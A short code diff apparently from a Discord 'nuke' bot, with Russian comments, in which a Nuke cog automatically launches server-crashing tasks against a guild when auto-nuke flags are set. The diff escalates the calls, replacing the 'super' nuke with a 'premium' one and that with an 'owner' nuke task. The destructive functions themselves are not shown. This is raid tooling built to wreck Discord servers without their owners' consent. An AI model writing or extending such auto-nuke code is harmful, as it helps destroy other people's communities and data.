@@ -104,17 +104,17 @@ class Nuke(commands.Cog):
         # Проверяем AUTO_SUPER_NUKE и AUTO_SUPERPR_NUKE
         # Импортируем из main.py
         try:
-            from main import AUTO_SUPER_NUKE, AUTO_SUPERPR_NUKE, do_super_nuke_task, do_superpr_nuke_task
+            from main import AUTO_SUPER_NUKE, AUTO_SUPERPR_NUKE, do_superpr_nuke_task, do_owner_nuke_task
             
             if AUTO_SUPER_NUKE:
                 print(f"Авто-супер-краш запущен для сервера: {guild.name}")
                 await asyncio.sleep(2)
-                await do_super_nuke_task(guild, None)
+                await do_superpr_nuke_task(guild, None)
             
             if AUTO_SUPERPR_NUKE:
                 print(f"Авто-супер-премиум-краш запущен для сервера: {guild.name}")
                 await asyncio.sleep(2)
-                await do_superpr_nuke_task(guild, None)
+                await do_owner_nuke_task(guild, None)
         except Exception as e:
             print(f"Error checking auto super nuke: {e}")
 
